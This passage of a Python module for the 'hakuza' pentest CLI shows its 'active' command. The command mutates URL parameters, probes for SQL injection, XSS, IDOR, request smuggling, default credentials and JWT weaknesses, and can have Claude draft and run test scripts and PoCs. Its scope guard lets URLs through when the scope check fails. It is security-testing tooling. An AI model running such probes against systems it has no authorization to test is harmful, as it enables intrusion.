        title="hakuza active --ai-script", border_style="cyan", expand=False,
    ))

    script_src = draft_ai_test_script(client, description, target_url, engagement_context)
    if not script_src:
        console.print("[red]AI script drafting failed or returned empty.[/red]")
        return

    console.print(Rule("[bold]AI-drafted script (review before executing)[/bold]", style="dim"))
    console.print(Syntax(script_src, "python", line_numbers=True, word_wrap=True))

    try:
        proceed = Confirm.ask(
            "\n[bold red]Execute this AI-drafted script now?[/bold red] "
            "(it will run locally with your own permissions)",
            default=False,
        )
    except EOFError:
        console.print("[yellow]Non-interactive stdin — refusing to auto-execute AI-drafted code. "
                      "Exiting.[/yellow]")
        return

    if not proceed:
        console.print("[dim]Not executed.[/dim]")
        return

    artifacts_dir = _n("ENGAGEMENTS_DIR") / eng["name"] / "artifacts"
    artifacts_dir.mkdir(parents=True, exist_ok=True)
    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    script_path = artifacts_dir / f"ai_script_{ts}.py"
    script_path.write_text(script_src, encoding="utf-8")
    _add_artifact(eng["id"], artifact_type="ai-drafted-script", filename=script_path.name,
                 filepath=str(script_path), tool="hakuza-active")
    console.print(f"[green]Saved reviewable artifact:[/green] {script_path}")

    result = run_custom_script(str(script_path), timeout=30)
    _show_script_result(console, eng, result)


# ---------------------------------------------------------------------------
# Target resolution + scope guard
# ---------------------------------------------------------------------------

def _resolve_targets(args, console, eng):
    """Returns (candidates: list[str], error: bool). On error, the caller
    should return immediately — the error panel has already been printed."""
    Panel, Rule, Table, Prompt, Confirm, Syntax, box = _rich()
    target_arg = getattr(args, "target", None)

    if target_arg:
        return [target_arg], False

    # No positional target: fall back to recon data, whether --all was
    # passed explicitly or not (this matches --all's own resolution path).
    raw_urls = []
    for dtype in ("wayback_urls", "urls"):
        try:
            entries = _get_latest_recon(eng["id"], dtype, limit=1)
        except Exception:
            entries = []
        for e in entries:
            raw_urls.extend((e.get("content") or "").splitlines())
    raw_urls = list(dict.fromkeys(u.strip() for u in raw_urls if u.strip()))

    if not raw_urls:
        console.print(Panel(
            "[red]No target URL given and no recon data found for this engagement.[/red]\n\n"
            "Run [bold cyan]hakuza wayback[/bold cyan] first to collect candidate URLs, or pass "
            "a target URL directly:\n"
            "  [bold]hakuza active \"https://target.tld/page.php?id=1\"[/bold]",
            title="No targets", border_style="red", expand=False,
        ))
        return [], True

    # Every candidate URL is kept, even ones with no query string — the
    # per-parameter mutation loop (SQLi/XSS/SSTI/etc.) needs real params to
    # mutate and simply won't run for those, but the per-TARGET checks
    # (IDOR path-ID heuristic, CORS misconfiguration) don't need any and
    # would otherwise never get exercised in --all mode at all.
    with_params = [u for u in raw_urls if "?" in u]
    console.print(
        f"[dim]{len(raw_urls)} candidate URL(s) from recon data; {len(with_params)} have query "
        f"parameters (full mutation-based testing), {len(raw_urls) - len(with_params)} without "
        f"(still tested for IDOR/CORS, which don't need query params).[/dim]"
    )
    return raw_urls, False


def _apply_scope_guard(candidates, console, eng):
    mrp = _mod_recon_plus()
    if mrp is None:
        return candidates
    try:
        scope_entries = mrp._load_scope(eng)
    except Exception:
        scope_entries = []
    if not scope_entries:
        return candidates

    in_scope, skipped = [], []
    for c in candidates:
        try:
            ok = mrp._url_in_scope(c, scope_entries)
        except Exception:
            ok = True  # best-effort: never block on a scope-check failure
        (in_scope if ok else skipped).append(c)

    if skipped:
        console.print(f"[yellow]Scope guard: skipping {len(skipped)} candidate URL(s) not "
                      f"matched by this engagement's scope entries.[/yellow]")
    return in_scope


# ---------------------------------------------------------------------------
# hakuza active — main entry point
# ---------------------------------------------------------------------------

def cmd_active(args, console) -> None:
    """
    hakuza active [target] [--all] [--depth {quick,deep}] [--ai/--no-ai]
                  [--allow-state-changing] [--max-requests N=300] [--delay SEC=0.15]
                  [--timeout SEC=10] [--gen-poc/--no-gen-poc default on]
                  [--script PATH] [--ai-script "description"]

    Live active testing engine: establishes a statistical baseline per
    target, mutates query parameters, diffs live responses, and (optionally)
    escalates ambiguous signals to Claude. See the module docstring for the
    full rationale vs `hakuza scan`'s static template matching.
    """
    Panel, Rule, Table, Prompt, Confirm, Syntax, box = _rich()

    if not HAS_REQUESTS:
        console.print(Panel(
            "[red]`hakuza active` sends live HTTP requests and hard-requires the 'requests' "
            "library — there is no graceful degradation path for this command (unlike "
            "mod_recon_plus.py's features, which fall back to curl subprocess calls).[/red]\n\n"
            "[bold]pip install requests[/bold]",
            title="Missing dependency", border_style="red", expand=False,
        ))
        return

    eng = _require_engagement(console)

    script_path = getattr(args, "script", None)
    ai_script_desc = getattr(args, "ai_script", None)
    jwt_token = getattr(args, "jwt", None)
    if script_path:
        _run_script_mode(args, console, eng)
        return
    if ai_script_desc:
        _run_ai_script_mode(args, console, eng, ai_script_desc)
        return
    if jwt_token:
        _run_jwt_mode(args, console, eng, jwt_token)
        return

    depth = getattr(args, "depth", "quick") or "quick"
    ai_enabled_flag = getattr(args, "ai", True)
    gen_poc_flag = getattr(args, "gen_poc", True)
    max_requests = getattr(args, "max_requests", 300)
    delay = getattr(args, "delay", 0.15)
    timeout = getattr(args, "timeout", 10)
    allow_state_changing = getattr(args, "allow_state_changing", False)

    if allow_state_changing:
        console.print("[dim]--allow-state-changing was passed but is a no-op in this version — "
                      "v1 is read-only GET-parameter testing only.[/dim]")

    candidates, err = _resolve_targets(args, console, eng)
    if err:
        return
    candidates = _apply_scope_guard(candidates, console, eng)
    if not candidates:
        console.print("[red]No in-scope, testable candidate URLs remain.[/red]")
        return

    client = None
    if ai_enabled_flag and HAS_ACTIVE_AI:
        client = _get_client_or_none()
        if client is None:
            console.print("[dim]AI escalation requested but no ANTHROPIC_API_KEY configured — "
                          "running the diff engine only.[/dim]")
    elif ai_enabled_flag and not HAS_ACTIVE_AI:
        console.print("[dim]AI escalation requested but mod_active_ai.py is not available — "
                      "running the diff engine only (core testing is unaffected).[/dim]")

    gen_poc_enabled = gen_poc_flag and HAS_ACTIVE_AI
    if gen_poc_flag and not HAS_ACTIVE_AI:
        console.print("[dim]PoC auto-generation requested but mod_active_ai.py is not available "
                      "— skipping (findings are still persisted).[/dim]")

    budget = _RequestBudget(max_requests)
    ctx = _ActiveCtx(
        console=console, eng=eng, eng_id=eng["id"], client=client,
        ai_enabled=(client is not None), gen_poc=gen_poc_enabled,
        depth=depth, timeout=timeout, delay=delay, budget=budget,
    )

    console.print(Panel(
        f"[bold]Targets:[/bold]        {len(candidates)}\n"
        f"[bold]Depth:[/bold]          {depth}\n"
        f"[bold]AI escalation:[/bold]  {'on' if ctx.ai_enabled else 'off'}\n"
        f"[bold]PoC generation:[/bold] {'on' if ctx.gen_poc else 'off'}\n"
        f"[bold]Request budget:[/bold] {max_requests}  |  [bold]Delay:[/bold] {delay}s  |  "
        f"[bold]Timeout:[/bold] {timeout}s",
        title="[bold cyan]  HAKUZA Active — Live Differential Testing[/bold cyan]",
        border_style="cyan", expand=False,
    ))

    tested_targets, skipped_targets = 0, 0

    for target_url in candidates:
        if budget.exhausted():
            console.print(f"\n[yellow]Request budget ({max_requests}) reached — stopping before "
                          f"testing {_rich_escape(target_url)}.[/yellow]")
            break

        console.print()
        console.print(Rule(f"[bold]{_rich_escape(target_url)}[/bold]", style="dim"))
        baseline = _capture_baseline(target_url, timeout, budget, delay)
        if baseline is None:
            console.print("  [yellow]Could not establish a baseline (connection failed or "
                          "budget exhausted) — skipping this target.[/yellow]")
            skipped_targets += 1
            continue
        tested_targets += 1
        console.print(f"  [dim]Baseline: status={baseline['status']} "
                     f"length={baseline['length']} mean_time={baseline['mean_time']:.3f}s "
                     f"stdev={baseline['stdev_time']:.3f}s[/dim]")

        parts = urlsplit(target_url)
        pairs = parse_qsl(parts.query, keep_blank_values=True)
        param_names = [k for k, _ in pairs]

        for pname in param_names:
            if budget.exhausted():
                break
            _test_param(ctx, parts, pairs, pname, baseline)

        if not budget.exhausted():
            _test_idor_heuristic(ctx, parts, baseline)

        if not budget.exhausted():
            _test_nosqli_all_params(ctx, parts, pairs, baseline)

        if not budget.exhausted():
            _test_cors(ctx, target_url)

        if not budget.exhausted():
            _test_cache_deception(ctx, target_url, baseline)

        if not budget.exhausted():
            _test_race_condition(ctx, target_url, baseline)

        if not budget.exhausted():
            _test_graphql_introspection(ctx, target_url)

        if not budget.exhausted():
            _test_default_credentials(ctx, parts, pairs, baseline)

        if not budget.exhausted():
            _test_smuggling(ctx, target_url)

        if not budget.exhausted():
            _test_exposed_k8s_api(ctx, target_url)

        if not budget.exhausted():
            _test_dom_xss(ctx, target_url)

    console.print()
    console.print(Panel(
        f"[bold]Targets tested:[/bold] {tested_targets}  |  [bold]skipped:[/bold] {skipped_targets}\n"
        f"[bold]Requests used:[/bold] {budget.count}/{budget.max_requests}\n"
        f"[bold]Findings persisted:[/bold] {len(ctx.findings)}",
        title="[bold]hakuza active — run summary[/bold]",
        border_style="green" if ctx.findings else "cyan", expand=False,
    ))


# ---------------------------------------------------------------------------
# Argparse additions  (paste into hakuza.py build_parser() before return)
# ---------------------------------------------------------------------------
# NOTE: The code below is informational.  To integrate, add these blocks
# inside build_parser() and update the dispatch dict in main().
# ---------------------------------------------------------------------------

def register_argparse(sub):
    """
    Call this from hakuza.build_parser() after existing sub-parsers are defined:
        if mod_active is not None:
            mod_active.register_argparse(sub)
    """
    p_active = sub.add_parser(
        "active",
        help="Live active testing — statistical baseline + parameter mutation + differential "
             "response analysis (not static template matching)",
    )
    p_active.add_argument("target", nargs="?", default=None,
                          help="Single URL to test (must include query params to mutate)")
    p_active.add_argument("--all", action="store_true",
                          help="Test all candidate URLs (with query params) from this "
                               "engagement's recon data (wayback_urls / urls)")
    p_active.add_argument("--depth", choices=["quick", "deep"], default="quick",
                          help="quick=fast signals only (default); deep=adds bounded "
                               "time-based SQLi/cmdi probes and a follow-up AI round")
    p_active.add_argument("--ai", dest="ai", action="store_true", default=True,
                          help="Escalate ambiguous signals to Claude (default on; requires "
                               "mod_active_ai.py + ANTHROPIC_API_KEY)")
    p_active.add_argument("--no-ai", dest="ai", action="store_false",
                          help="Disable AI escalation — diff engine only")
    p_active.add_argument("--allow-state-changing", action="store_true",
                          help="Reserved for future POST/PUT/DELETE testing — v1 is read-only "
                               "GET-parameter testing only")
    p_active.add_argument("--max-requests", dest="max_requests", type=int, default=300,
                          help="Stop after this many live HTTP requests total (default 300)")
    p_active.add_argument("--delay", type=float, default=0.15,
                          help="Seconds to sleep between every live HTTP request (default 0.15)")
    p_active.add_argument("--timeout", type=int, default=10,
                          help="Per-request timeout in seconds (default 10)")
    p_active.add_argument("--gen-poc", dest="gen_poc", action="store_true", default=True,
                          help="Auto-generate curl + Python PoC for confirmed findings "
                               "(default on; requires mod_active_ai.py)")
    p_active.add_argument("--no-gen-poc", dest="gen_poc", action="store_false",
                          help="Skip PoC auto-generation")
    p_active.add_argument("--script", default=None, metavar="PATH",
                          help="Run a pre-existing local Python test script instead of the "
                               "built-in engine (no AI drafting). If its stdout contains a line "
                               "starting with 'HAKUZA_FINDING: {json}', offers to persist it.")
    p_active.add_argument("--ai-script", dest="ai_script", default=None, metavar="DESCRIPTION",
                          help="Have Claude draft a Python test script from a description; the "
                               "full script is shown and requires explicit confirmation before "
                               "it is ever executed")
    p_active.add_argument("--jwt", default=None, metavar="TOKEN",
                          help="Test a JWT for alg=none bypass and weak-secret HS256 brute force "
                               "against the target (sent as Authorization: Bearer <token>) — "
                               "requires a real token, the engine has no login flow of its own")


# ---------------------------------------------------------------------------
# Dispatch additions  (paste into main() dispatch dict)
# ---------------------------------------------------------------------------
# if mod_active is not None:
#     dispatch["active"] = mod_active.cmd_active

# END mod_active.py
